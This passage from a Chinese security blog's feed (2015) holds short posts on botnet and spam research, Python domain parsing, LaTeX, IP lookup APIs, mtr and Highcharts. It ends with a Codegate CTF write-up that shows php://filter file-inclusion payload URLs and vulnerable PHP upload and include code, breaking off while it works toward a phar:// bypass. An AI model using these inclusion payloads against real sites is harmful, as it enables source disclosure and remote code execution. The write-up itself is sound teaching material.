+<li>提出了SMTP通信痕迹概念，其实这个概念作者以前的文章就提出了。按照我的理解就是如果使用自定义搭建的SMTP发信的时候通信过程中会多一些步骤，同时可以通过这个过程来标示一个发信机器；</li>
+<li>从邮件内容对恶意攻击进行分类，根据内容分为不同的列别；同时通过了Anubis和virustotal来分析IP的历史数据，是否存在恶意行为；</li>
+</ul>
+
+
+<h3>缺点</h3>
+
+<p>但是个人感觉文章存在以下不足：</p>
+
+<ul>
+<li>观测时间太短，从2012.12.14-2013.05.15时间跨度太短，做的网站很可能Google都还没有被收录，攻击者就没有办法获取你的邮箱地址；同时可以发现后面的发件人IP居然只有75个，不得不说数据量确实很少；</li>
+<li>还是上面的问题，始终感觉这种方式去逼近地下产业，数据量和切入点都太小了。</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[On the Arms Race in Spamming Botnet Mitigation]]></title>
+    <link href="http://blog.ourren.com/blog/2015/05/08/on-the-arms-race-in-spamming-botnet-mitigation/"/>
+    <updated>2015-05-08T14:54:59-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/05/08/on-the-arms-race-in-spamming-botnet-mitigation</id>
+    <content type="html"><![CDATA[<p>此文档是G Stringhini的开题报告<a href="http://www0.cs.ucl.ac.uk/staff/G.Stringhini/papers/writeup.pdf">这里下载</a>,针对Botnet的技术进化和科研上对应的防御方案进行了详细地讨论，对于研究botnet的人来说是一份非常不错得入门资料。文档主要分为四个部分:</p>
+
+<ul>
+<li>引言简单介绍了Botnet的威胁，来源和发展；</li>
+<li>第二部分主要介绍Botnet的进化，包含Botnet的通讯架构和感染两部分；</li>
+<li>第三部分主要介绍科研上针对Botnet和垃圾邮件的检测和防御机制；</li>
+</ul>
+
+
+<!--more-->
+
+
+<h3>引言</h3>
+
+<p>垃圾邮件可以被用来钓鱼，诈骗，但是很多大型电子商务网站都提供推荐/推广功能，攻击者可以通过发送大量这种邮件这种进行获利，然而你这类邮件基本上都是从Botnet机器进行发送，并且调查发现85%的Botnet机器都被用来发送垃圾邮件。针对这种现状研究人员和攻击者一直在这个技术领域进行较量。</p>
+
+<h3>Botnet的进化</h3>
+
+<p>Botnet架构的进化流程如下。</p>
+
+<ul>
+<li>IRC Botnet: 最初的Botnet是基于IRC的，受害者通过IRC地址和密码进入特定频道等待管理员发布命令。这种通信方式的弱点：研究人员可以通过恶意文件分析IP地址和密码，然后进入频道分析其行为；另外如果IRC基于域名，研究人员可以通过DNS重定向将所有的受害者机器进行转移；最后IRC协议明文通讯，可以通过协议上对这种行为进行检测；</li>
+<li>专有协议Botnet：为了避免已有的协议，攻击者通过自定义加密协议来进行通信；缺点在于研究人员可以对样本进行逆向分析其协议，并可以加入其队列分析行为；另外也存在DNS污染攻击；</li>
+<li>多级代理Botnet：通过多次跳转/代理进行隐藏，这种方式还是可以通过黑名单进行block;</li>
+<li>域名生成算法Botnet：通过设计一套基于时间的域名生成算法(DGA)，来实现不同时间段的回连地址; 算法部分也可以通过社交网络的标题或者内容进行回连。缺点在于攻击者可以逆向算法并提前注册域名或者攻击社交账号，或者直接block这些域名；</li>
+<li>P2P Botnet：针对无公网IP地址的内部受害者，利用一些算法实现P2P通信，缺点在于攻击者可以通过逆向分析其协议和特征，伪装为局域网管理者进行诱骗并分析所有受害主机；</li>
+</ul>
+
+
+<p>Botnet感染方式的进化流程如下：</p>
+
+<ul>
+<li>原始感染：通过受感染的机器去扫描更多的存在漏洞的主机并试图感染；</li>
+<li>现有感染：（1）通过垃圾邮件发送恶意程序，（2）建立恶意网页，欺骗受害者浏览（drive-by-download attack）；</li>
+</ul>
+
+
+<h3>Botnet的检测研究</h3>
+
+<p>针对Botnet的检测方式很多，概述如下：</p>
+
+<ul>
+<li>从主机层面进行检测：通过受害主机检测其样本，并提取特征码加入到杀毒软件特征库；通过分析恶意样本的语义和相似度进行匹配检测；基于动态进行的检测，其中还可以利用提取特征，机器学习进行结合；</li>
+<li>从恶意网页进行检测：利用机器学习和页面的特征（重定向，混淆脚本代码）进行静态检测；可以通过虚拟机真实环境浏览网页来动态检测；另外也可以通过不同时间段页面的变化情况进行检测（黑客入侵后会添加恶意代码）；常用攻击代码片段或者内容进行分析判断；</li>
+<li>从C&amp;C命令进行检测：通过透明协议，DGA域名进行检测；另外还可以通过搭建蜜罐抓取Botnet的行为进行分析；</li>
+<li>从DNS协议进行检测：通过局域网DNS的异常或者不常见规律进行检测；</li>
+<li>从SMTP协议进行检测：分析垃圾邮件的原始IP和其它信息来生成黑名单，或者统计这些IP规律；</li>
+<li>从社交网络进行检测：攻击者利用社交网络来传播恶意软件，分析攻击者的社交行为给出其IP/域名的安全性；</li>
+<li>从网络层面进行检测：恶意数据包，C&amp;C特定协议或者攻击包；</li>
+</ul>
+
+
+<h3>总结</h3>
+
+<p>文章从Botnet的发展到进化，并针对不同的技术点总结了前人对该点的检测技术，整体而言，内容十分比较丰富，特别是参考文献。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Python中域名处理技巧]]></title>
+    <link href="http://blog.ourren.com/blog/2015/04/26/python-with-domain/"/>
+    <updated>2015-04-26T12:05:01-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/04/26/python-with-domain</id>
+    <content type="html"><![CDATA[<p>Python中经常会遇到各种字符串处理问题，而在网络请求这块又经常与URL或者域名打交道，本文侧重介绍Python在处理URL/或者域名中的技巧，涉及到的Python主要有如下几种：</p>
+
+<ul>
+<li>urlparse</li>
+<li>tldextract</li>
+<li>dnspython</li>
+<li>domaintools</li>
+</ul>
+
+
+<!--more-->
+
+
+<h3>验证域名</h3>
+
+<p>判断一个域名是否有效，可以试用domaintools工具来实现，并且也有解析域名的功能，例如下面代码可以从域名的构成上分析是否有效「即不验证是否可ping」，另外也可以获取子域名和后缀：</p>
+
+<pre><code>from domaintools import Domain
+d = Domain('www.example.com')
+
+&gt;&gt;&gt; d.valid
+True
+
+&gt;&gt;&gt; d.domain
+u'example.com'
+
+&gt;&gt;&gt; d.subdomain
+u'www'
+
+&gt;&gt;&gt; d.tld
+u'com'
+
+&gt;&gt;&gt; d.sld
+u'example'
+</code></pre>
+
+<p>更多可以参见<a href="https://github.com/devhub/domaintools">Domain parsing with Python</a>.</p>
+
+<h3>域名解析</h3>
+
+<p>主从给定的URL提取其主机「即请求域名」，协议，路径，甚至参数。 例如从<a href="http://blog.ourren.com/2015/04/14/ip-information-with-python">http://blog.ourren.com/2015/04/14/ip-information-with-python</a> 获取“blog.ourren.com”, “http&#8221;, &ldquo;/2015/04/14/ip-information-with-python/&#8221;。</p>
+
+<p>此类问题一般采用urlparse来进行处理，针对处理后的数据进行拼接即可获得，示例代码如下：</p>
+
+<pre><code>from urlparse import urlparse
+print urlparse('http://blog.ourren.com/2015/04/14/ip-information-with-python/')
+ParseResult(scheme='http', netloc='blog.ourren.com', path='/2015/04/14/ip-information-with-python/', params='', query='', fragment='')
+</code></pre>
+
+<h3>主域名</h3>
+
+<p>主要是指获取域名的主域名「即需要去除子域名」和域名后缀，例如从<a href="http://blog.ourren.com/2015/04/14/ip-information-with-python">http://blog.ourren.com/2015/04/14/ip-information-with-python</a> 获取“ourren.com”，“com”；</p>
+
+<p>这类问题可以通过tldextract进行处理，而tldextract则是对tld库进行了封装，使用起来比较方便，示例代码如下：</p>
+
+<pre><code>import tldextract
+tldextract.extract("http://blog.ourren.com/2015/04/14/ip-information-with-python/")
+
+ExtractResult(subdomain='blog', domain='ourren', suffix='com')
+</code></pre>
+
+<h3>子域名</h3>
+
+<p>其实获取特定域名的子域名的思路主要有几种：基于字典的暴力解析；基于搜索引擎结果的去重分析；基于域传送漏洞；基于全球网站数据的筛选；并且也有很多开源的工具可以参考，<a href="https://www.sec-wiki.com/topic/3">SecWiki-二级域名搜索工具汇总</a> 就对这些工具进行了汇总，所以这里就不具体讨论了。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[LaTeX写作技巧总结]]></title>
+    <link href="http://blog.ourren.com/blog/2015/04/17/latex-skils-summary/"/>
+    <updated>2015-04-17T21:28:38-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/04/17/latex-skils-summary</id>
+    <content type="html"><![CDATA[<p>最近开始利用LaTeX写作复杂的文档，心情那个叫个爽呀，一点感觉不到排版的烦恼了。什么Word分页与分节？什么页眉与页脚？统统没有这种烦恼。这种写作乐趣就是让你只关注写作内容，爽歪歪地写下去，其实跟Markdown写博客，Git管理代码差不多的心情。其实这种烦恼只是转移到制作模板的人身上了，但是LaTeX实在是提供了太多的模板，so,尽管写吧。</p>
+
+<p>写作环境推荐：</p>
+
+<ul>
+<li><a href="http://texstudio.sourceforge.net/">TeXstudio</a> 免费软件做得非常好用，并且跨平台，更新及时，实时编译为PDF，英文单词自动纠正，其它特性就不说了，就这几个特性就可以秒杀很多同类软件；</li>
+<li><a href="http://www.tablesgenerator.com/latex_tables">tablesgenerator</a> 在线LaTex表格生成工具，谁用谁知道；</li>
+<li><a href="http://www.codecogs.com/latex/eqneditor.php">latex eqneditor</a> 在线LaTex公式生成工具；</li>
+<li>Excel 这个大家都懂的吧，画图好使；</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>下面给一些常用的LaTex实例代码：</p>
+
+<h4>插入图片</h4>
+
+<p>需要在顶部引入如下包，其中graphicspath中是设置图片的存放根目录，一般常常新建一个目录来存放图片。</p>
+
+<pre><code>\usepackage{graphicx}
+\usepackage{graphicx}
+\graphicspath{ {img/} }
+</code></pre>
+
+<p>在插入图片的时候使用如下代码，其中：</p>
+
+<pre><code>\begin{figure}[!htb]
+    \centering
+    \includegraphics[width=0.5\textwidth]{picture_name}
+    \caption{describe of this image\label{fig:image}}
+\end{figure}
+</code></pre>
+
+<ul>
+<li>width 表示这个图片占的宽度；</li>
+<li>picture_name 表示文件名；</li>
+<li>lable 正文中引用使用，格式s~\ref{fig:image}；</li>
+</ul>
+
+
+<h4>插入表格</h4>
+
+<p>表格直接使用在线工具生成，一般也会新建一个文件夹例如table来存放表格，每个表格单独保存为xxx.tex文件，然后使用如下代码引入表格：</p>
+
+<pre><code>\input{tables/xx.tex}
+</code></pre>
+
+<h4>双栏并排</h4>
+
+<p>这里的双栏并排主要是指表格或者图片双栏显示，比如需要讲两个图显示在一行，可以先引入如下包，然后使用下面的代码就可以将两个表格并排。其实还是通过textwidth的属性值来控制宽度的。</p>
+
+<pre><code>\usepackage{graphicx}
+\usepackage{subfigure}
+
+\makeatletter\def\@captype{figure}\makeatother
+\begin{table*}
+    \begin{minipage}{0.50\textwidth}
+        \centering
+        \input{tables/a.tex}
+        \caption{describe a table}
+        \label{table:a}
+    \end{minipage}
+    \makeatletter\def\@captype{table}\makeatother
+    \begin{minipage}{0.50\textwidth}
+        \centering
+        \input{tables/b.tex}
+        \caption{describe b table}
+        \label{table:b}
+    \end{minipage}
+\end{table*}
+</code></pre>
+
+<h4>插入算法</h4>
+
+<p>插入伪代码的生活需要先包含如下包：</p>
+
+<pre><code>\usepackage{algorithm}
+\usepackage{algpseudocode}
+\usepackage{amsmath}
+\usepackage{graphics}
+\usepackage{epsfig}
+\renewcommand{\algorithmicrequire}{\textbf{Input:}}  % Use Input in the format of Algorithm
+\renewcommand{\algorithmicensure}{\textbf{Output:}} % Use Output in the format of Algorithm
+</code></pre>
+
+<p>伪代码的具体写法如下, 更多详细的语法可以参照这里 <a href="http://www.ctex.org/documents/packages/verbatim/algorithms.pdf">LaTex algorithms</a>:</p>
+
+<pre><code>\begin{algorithm}[!htb]
+\caption{describe algorithm.}
+\label{alg:new}
+\begin{algorithmic}[1]
+    \Require
+    input, $D$;
+    input varible;
+    \Ensure
+    \For{each virable in D$}
+    \EndFor
+    \State xxxx
+    \EndFor
+    \label{code:recentEnd}
+\end{algorithmic}
+\end{algorithm}
+</code></pre>
+
+<h4>列表描述</h4>
+
+<p>在有些时候需要列出个1，2，3的列表，具体格式就很简单了，主要有itemize和enumerate两种，前者是列表前面是符号，而后者就是(1),(2)这种。</p>
+
+<pre><code>\begin{itemize}
+    \item one
+    \item two
+    \item three 
+\end{itemize}
+
+\begin{enumerate}
+    \item one
+    \item two
+    \item three 
+\end{enumerate}
+</code></pre>
+
+<h4>图表排列</h4>
+
+<p>如果需要将文中的所有图片放在最后面，可以包含如下的包即可：</p>
+
+<pre><code>\usepackage{endfloat}
+\usepackage{epstopdf}
+</code></pre>
+
+<h4>参考文献</h4>
+
+<p>一般是新建一个biblio.bib来专门存放参考文件，然后利用如下代码引入：</p>
+
+<pre><code>\bibliographystyle{IEEEtran}
+\bibliography{biblio}
+</code></pre>
+
+<p>同时一个项目的文献这些可以使用 <a href="https://www.zotero.org/">zoteo</a> 或者 <a href="https://www.mendeley.com/">mendeley</a>来管理并导出。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[利用公开接口获取IP信息]]></title>
+    <link href="http://blog.ourren.com/blog/2015/04/14/ip-information-with-python/"/>
+    <updated>2015-04-14T11:20:48-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/04/14/ip-information-with-python</id>
+    <content type="html"><![CDATA[<p>其实关于IP信息的讨论和文章非常多，但是选择适合一种简洁并且有效的方法无疑是最佳的。同时查询IP信息主要由两种方式：在线查询/接口，本地IP数据库。 现将目前这方面的资源总结如下：</p>
+
+<h4>在线平台/接口</h4>
+
+<p>虽然目前能够提供IP信息查询的平台很多，但是国内最著名的可能还是<a href="http://ip138.com/">ip138</a>，但是IP138目前能够提供的IP信息确实太少了，不管是做渗透还是做项目相信大家都不会采用这个查询，目前做得不错的主要有如下接口，鉴于IP信息存在国外和国内的差别，因此还是简单做下分类：</p>
+
+<!--more-->
+
+
+<p>国内IP信息查询平台：</p>
+
+<ul>
+<li><a href="http://www.ipip.net/">IPIP</a></li>
+<li><a href="http://ip.qq.com/">腾讯IP</a></li>
+<li><a href="http://ip.taobao.com/">淘宝IP</a></li>
+<li><a href="http://ip138.com/">IP138</a></li>
+</ul>
+
+
+<p>国外IP信息查询平台：</p>
+
+<ul>
+<li><a href="http://ip-api.com/">ip-api</a></li>
+<li><a href="https://db-ip.com/">db-ip</a></li>
+<li><a href="http://bgp.he.net/">BGP</a></li>
+<li><a href="http://www.ip2location.com/demo">ip2location</a></li>
+</ul>
+
+
+<p>国内的查询相对比较简洁，而国外的在线平台给出的数据相对比较多，但是db-ip和ip2location每天都有限制查询，而ip-api则直接提供了API的查询接口，并且没有限制查询数量。</p>
+
+<h4>本地IP数据库</h4>
+
+<p>如果所做系统不能联网或者由于其它原因需要离线IP信息查询，国内和国外都有很著名的离线IP数据库,在项目需求不高时可以使用，现统计如下：</p>
+
+<ul>
+<li>国内的<a href="http://www.cz88.net/">IP纯真数据库</a>；</li>
+<li>国外的<a href="http://dev.maxmind.com/zh-hans/geoip/legacy/geolite/">MaxMind Geo数据库</a>；</li>
+<li>国内最近的<a href="http://www.ipip.net/download.html">ipip</a></li>
+</ul>
+
+
+<h4>Python查询接口</h4>
+
+<p>Python写接口查询就相对比较容易了，但是鉴于很多接口都请求次数限制，因此需要考虑的问题还是比较多，总结如下：</p>
+
+<ul>
+<li>Python下使用requests进行https请求时，可能会遇到证书问题，当设置“verify=False”时会出现警告信息，可以通过导入warning库进行处理，具体见<a href="https://github.com/kennethreitz/requests/issues/2214">这里</a>;</li>
+<li>如果是采用网页进行请求匹配，最好直接用字符串查找替换（replace,split）就OK，正则会有一些问题；</li>
+<li>如果HTTP请求可以通过添加代理来绕过查询次数限制；</li>
+</ul>
+
+
+<p>写了三个平台(ip-api, db-ip, ip2location)的查询接口，大家可以拿去直接用, 推荐ip-api这个接口。</p>
+
+<p>项目地址：<a href="https://github.com/ourren/ip-api">ip-api</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[利用MTR分析网络状况]]></title>
+    <link href="http://blog.ourren.com/blog/2015/03/27/diagnosing-network-issue-with-mtr/"/>
+    <updated>2015-03-27T12:00:33-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/03/27/diagnosing-network-issue-with-mtr</id>
+    <content type="html"><![CDATA[<p>平时测试网络状况一般都使用「ping, tracert, nslookup」这几个命令，但是<a href="https://github.com/traviscross/mtr">Mtr</a>(My traceroute)是一是一个非常棒的网络连通性判断工具，它结合了ping, traceroute,nslookup 的相关特性。当网络链路出现问题时很多人会用ping命令，可以简单的测试网络的连通性，看下丢包率，但是却无法确定是在哪里出现了问题；有些人就会用tracert命令来查看路由，或者用nslookup命令来查看DNS是否可用；如果你也觉得这三个命令太麻烦的话，那就用mtr吧，并且显示界面很美「没觉得么？」<!--more --></p>
+
+<pre><code>                           My traceroute  [v0.71]
+ts3-142.ts.cn.tlan (0.0.0.0)                           Fri Aug  3 22:39:50 2007
+Keys:  Help   Display mode   Restart statistics   Order of fields   quit
+                                              Packets               Pings
+ Host                                       Loss%  Last   Avg  Best  Wrst StDev
+ 1. 172.16.76.1                              0.0%   0.5   0.4   0.4   0.5   0.1
+ 2. 202.108.132.17                           0.0% 179.0  20.2   2.3 179.0  55.8
+ 3. 172.19.140.69                            0.0%  13.7  10.3   6.2  17.1   3.8
+ 4. 172.17.0.17                              0.0%   9.3  16.5   8.6  62.3  16.3
+ 5. 172.16.0.57                              0.0%   9.9  11.2   6.1  21.0   5.4
+ 6. 192.168.0.25                             0.0%   7.3  11.4   5.1  17.2   4.2
+ 7. 210.74.176.241                          10.0% 110.1 109.6  92.7 123.3  11.3
+ 8. 202.96.13.101                           20.0% 104.9 111.8 101.4 126.5   9.3
+ 9. 202.106.192.233                         30.0% 120.7 113.8  85.5 138.8  17.2
+10. 61.148.143.26                           10.0%  99.7 112.0  99.7 120.9   6.9
+11. 202.96.8.246                            20.0%  97.0 108.2  92.3 137.4  14.3
+12. 210.77.38.126                           11.1% 133.0 113.8  97.0 133.0  11.8
+13. 
+</code></pre>
+
+<h4>安装步骤</h4>
+
+<p>Mac下直接用brew进行安装「虽然经常吐槽brew各种不如linux下的包管理软件，但是有时候还是不错」：</p>
+
+<pre><code>brew install mtr
+sudo /usr/local/Cellar/mtr/0.86/sbin/mtr 8.8.8.8
+ln -s /usr/local/Cellar/mtr/0.86/sbin/mtr /usr/bin
+sudo mtr 8.8.4.4
+</code></pre>
+
+<p>Linux貌似就更简单：</p>
+
+<pre><code>yum -y install mtr
+apt-get install mtr-tiny
+</code></pre>
+
+<p>Windows只能用这<a href="http://sourceforge.net/projects/winmtr/">WinMTR</a>替代下。</p>
+
+<h4>相关命令</h4>
+
+<p>查看help:</p>
+
+<pre><code>root@ts3-142 ~]# mtr --help
+usage: mtr [-hvrctglspni46] [--help] [--version] [--report]
+                [--report-cycles=COUNT] [--curses] [--gtk]
+                [--raw] [--split] [--no-dns] [--address interface]
+                [--psize=bytes/-s bytes]
+                [--interval=SECONDS] HOSTNAME [PACKETSIZE]
+
+各主要参数解释如下：
+--report                       追踪结果以报告模式输出
+--report-cycles=COUNT          定义追踪的次数，默认为16
+--raw                          使结果以原始格式输出
+--split                        将每次追踪的结果分别列出来，不象--report一样，统计整个结果
+--no-dns                       只显示ip地址，不解析ip地址对应的主机名
+--psize=bytes/-s bytes         定义数据包的大小，单位是字节
+</code></pre>
+
+<p>日常一般这样子用就可以得到前面的报告结果了。</p>
+
+<pre><code>mtr --report -c 10 -n www.turbolinux.com.cn
+//或者
+ mtr --report www.google.com
+ mtr --no-dns --report google.com
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Highcharts使用入门与技巧]]></title>
+    <link href="http://blog.ourren.com/blog/2015/03/23/highchart-note-with-php/"/>
+    <updated>2015-03-23T00:00:00-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/03/23/highchart-note-with-php</id>
+    <content type="html"><![CDATA[<p><a href="http://www.highcharts.com/">Highcharts</a>作为最牛逼的前端图形库当之不愧，不仅使用简单并且非盈利项目可以免费使用，复制粘贴几下就可以生成绚丽的图表，方便各位给Leader或者外行人员装逼专用。虽然说目前百度的<a href="http://echarts.baidu.com">Echarts</a>也非常火爆，荣获github上国内加星最多的项目，但是个人始终觉得还是Highcharts更胜一筹，不过在大数据特征展示上面我还是推荐Echarts。</p>
+
+<p>个人接触Highcharts已经有好几年了，但是从来都没怎么深入研究过，不过话又说回来，Highcharts这种傻瓜式的前端库也没有高深的使用技巧，但是对于不熟悉的新手可以从如下的总结中进步提升。</p>
+
+<!--more-->
+
+
+<h3>初级配置</h3>
+
+<p>初级配置就是把Highcharts给跑起来，复制几段代码就ok：</p>
+
+<ul>
+<li>HTML页面中包含<a href="http://www.highcharts.com/lib/jquery-1.7.2.js">jquery.js</a>, <a href="http://code.highcharts.com/highcharts.js">highcharts.js</a>, <a href="http://code.highcharts.com/modules/exporting.js">exporting.js</a>；</li>
+<li>打开<a href="http://www.highcharts.com/demo/">highcharts demo</a>中的任意样式，然后选择「view options」就可以看到此demo的实现代码，复制到你的HTML页面中；</li>
+<li>在HTML页面中新建一个div层，id为「container」；</li>
+<li>刷新浏览器看效果。</li>
+</ul>
+
+
+<p>以上就是初级配置的详细过程；</p>
+
+<h3>主题修改</h3>
+
+<p>在demo页面中其实有很多的主题样式「dark, gray, sand等」，使用的时候也很简单:</p>
+
+<ul>
+<li>下载<a href="https://github.com/highslide-software/highcharts.com/tree/master/js/themes">主题文件</a>中对应颜色的js文件到你本地;</li>
+<li>在你的HTML页面中包含对应的JS文件；</li>
+<li>完工</li>
+</ul>
+
+
+<h3>线条修改</h3>
+
+<p>颜色修改</p>
+
+<p>在具体的项目中，当你需要修改线条的颜色时，你可以通过在demo 实例代码中添加如下代码：</p>
+
+<pre><code>series: [{
+        name: 'Tokyo',
+        data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6],
+        color: 'blue'
+    }]
+</code></pre>
+
+<p>即在数据的下面添加了color属性，color的值可以取颜色对应的英文名字，例如「red, purple, green」等;</p>
+
+<p>线条形状</p>
+
+<p>可能你需要在一幅图形中显示相同颜色的两条曲线，这样你可以通过显示虚线或者实线来实现，显示代码如下：</p>
+
+<pre><code>series: [{
+        name: 'Tokyo',
+        data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6],
+        dashStyle: 'dash',
+        color: 'blue'
+    }]
+</code></pre>
+
+<p>添加dashStyle属性即可修改线条的形状</p>
+
+<h3>PHP代码结合</h3>
+
+<p>很多时候，highcharts需要的数据其实是由后端脚本生成的，比如PHP，这里可以通过PHP的json_encode实现快速赋值,当然输入是一个数组；</p>
+
+<pre><code>series: [{
+        name: 'original',
+        data: &lt;?php echo json_encode(getData('PV'));?&gt;,
+        dashStyle: 'dash',
+        color: 'orange',
+    }]
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Phar突破文件包含]]></title>
+    <link href="http://blog.ourren.com/blog/2015/03/16/phar_include_exploit/"/>
+    <updated>2015-03-16T00:00:00-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/03/16/phar_include_exploit</id>
+    <content type="html"><![CDATA[<p>Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过<a href="http://php.net/manual/zh/wrappers.php.php">php://filter</a>读取页面源文件，对php://filter不熟悉的可以研究下：</p>
+
+<pre><code>http://x/owlur/index.php?page=php://filter/convert.base64-encode/resource=upload
+http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
+</code></pre>
+
+<p>其中读取后的内容是经过编码了的，要看源码记得解码，比如rot13可以在Linux下：<!--more--></p>
+
+<pre><code>cat 1.php | rot13
+</code></pre>
+
+<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：</p>
+
+<pre><code>&lt;?php
+$p = $_REQUEST['page'];
+
+if($p == "" || $p == "index")
+{
+$p = "main";
+}
+
+$haq = base64_decode("ICAgICAgICAgICAgICAgICAgIC8tLS0tLS0tLS0KICAgICAgICAgICAgICAgICAgLyAvIC8qKioqKipcCiAgICAgICAgICAgICAgICAgLyAvKioqKi0tICogKlwKICAgICAgLy8oKCg6PDw8PC86KioqKioqKioqM1xYKlwoKDwKICAgICAvWFgvQ1hDJkNHRy8vKiovLS0vLy9YKlZcKiouLmcmCigvVkNDM2dnMC4uLi4uLi4uKi8vWC8vKC8vL1YqQ1wqLi44ODhnZzhnJjNDPAooMyZnRyYuLi4uLi4uLi4uLiouLlhYWC8oKCgvKi5cKi4uLi4uLi5HLzA4ODgzWDxgCi8oPEM4IC4uLi4uLi4uLi4uKi5YWFhYLy8vLzwvLi4qLi4uLi4uLi4uLi4uLi4uM0NeClgvLzw8Ly4uLi4uLi4uLi4uKiZDVlgvLy9WLzw8Ly4qLi4uLi4uLi4uLi4uLi4uOEdDPApYWC9DLzo8L1YuLi4uLi4uLiomM0NWWFZYVlgoPFYqKi4uLi4uLi4uLi4uLi4uLiBnOENeCiAgICBHQy88PC8oLi4uLi44RyYzQ0NWWFhYWFZ+WFYqLi4uLi4uLi4uLi4uLi4uIEM4M1YKICAgICAgIFYvPF48KFg4OCZWLy8oKDw8PDwoKDxePCoqLi4uLi4uLi4uLi4uLi4uWCYmQwogICAgICAgICAgICAgIGA6L0NDVi8oKCg8PCgvVlZWLyouLi4uLi4uLi4uLi4uLigvQyYvCiAgICAgICAgICAgICAgIDw8IF5eKC9WMzNWWC9WQyZYKlZDLi4uLjo8PH48PDwoKFggIGAKICAgICAgICAgICAgICAgVi8oLzwgXiBeXjovWC8oKDw8Xl4tLS1WOn5+PDwoCiAgICAgICAgICAgICAgMyYgICAgICAgICAgICAgICAgICAuXi0vCiAgICAgICAgICAgICAgQyAgL1wgICAgICAgL1wgICAgICAgIHwKICAgICAgICAgICAgIC9DICBcLyAgICAgICBcLyAgICAgICAvLwogUExaIFNUT1AgICAgIDMgICAgICAgICAgICAgICAgICAgIHxcCiAgIEhBQ0tJTkcgICAgQyAgICAgICAgICAgICAgICAgICAvNSoKICAgICAgICAgICAgICBWICAgICAvLS0tLS1cICAgICAgIC8KICAgICAgICAgICAgICBDRyAgfCAgICAgICAgIHwgIDwvLy88CiAgICAgICAgICAgICAgVkdWIHwgICAgICAgICB8IF4oL1g8XgogICAgICAgICAgICAgICAmJjwgIFwtLS0tLS8gIC4oKDwoXgogICAgICAgICAgICAgICAgODMoICAgICAgICAuPCh+YDw8CiAgICAgICAgICAgICAgICAgOFhgICAgICAuPDxeYCBgKCheCiAgICAgICAgICAgICAgICBCQEBDPC5gXl5gICAgICBeKENHJkMoPC5gYAogICAgIENHOEIkQEBAQEBAQEBAJCggICAgICAgICAgXl4oMEBAQEAkODNYPGAKICAgQkBAQEBAQEBAQEBAQEBAQEBAOC8gICAgICAgYDxDJEBAQEBAQEBAQEAkJjwKICBAQEBAQEBAQEBAQEBAQEAkJCRAQEAkJDA4ODhCQEBAQEBAQEBAQEBAQEBAQEBWYAogQEBAQEBAQEBAQEBAQEAkQCQkJCQkJCRAQEBAJCRAQEAkQEBAQEBAQEBAQEBAQEBDYApAQEBAQEBAQEBAQEBAQCRAJCQkJCQkJCQkJCQkJCQkJCQkQEBAQEBAQEBAQEBAQEBAKGAKQEBAQEBAQEBAQEAkQCQkJCQkJCQkJCQkJCQkQEAkJEBAQEBAQEBAQEBAQEBAQEBAQEIK");
+$haq = htmlentities($haq);
+
+if(strstr($p,"..") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
+
+if(stristr($p,"http") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
+
+if(stristr($p,"ftp") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
+
+if(strlen($p) &gt;= 60)
+die("&lt;pre&gt;string &gt; 60
+$haq&lt;/pre&gt;");
+
+$inc = sprintf("%s.php",$p);
+
+?&gt;
+&lt;?php
+include($inc);
+?&gt;
+</code></pre>
+
+<p>可以发现其实page参数可以控制，然后会在后面加一个包含的文件名后面加一个“.php”进行文件包含。</p>
+
+<p>另外而此程序可以上传图片，而上传时只能上传jpg图片，其实程序只检测了后缀是不是jpg结尾的，同时在另存为时程序会自动重命名：随机字符串*6.jpg，也就是说：</p>
+
+<pre><code>xxxx.jpg ----&gt;randon.jpg
+</code></pre>
+
+<p>其实他没有检测该上传文件是否合法，所以原始文件可以上传上去的，只不过后缀给改为.jpg了。因此我们可以上传我们需要的文件，但是怎么进行包含，这个确实很考脑力：</p>
+
+<ul>
+<li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
+<li>不存在截断，因为php版本为：5.5.x；</li>
+<li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
+</ul>
+
+
+<p>查询PHP手册发现PHP支持如下的<a href="http://php.net/manual/en/wrappers.php">Wrappers</a>：</p>
+
+<ul>
+<li>file:// — Accessing local filesystem</li>
+<li><a href="http://">http://</a> — Accessing HTTP(s) URLs</li>
+<li><a href="ftp://">ftp://</a> — Accessing FTP(s) URLs</li>
+<li>php:// — Accessing various I/O streams</li>
+<li>zlib:// — Compression Streams</li>
+<li>data:// — Data (RFC 2397)</li>
+<li>glob:// — Find pathnames matching pattern</li>
+<li>phar:// — PHP Archive</li>
+<li>ssh2:// — Secure Shell 2</li>
+<li>rar:// — RAR</li>
+<li>ogg:// — Audio streams</li>
+<li>expect:// — Process Interaction Streams</li>
+</ul>
+
+
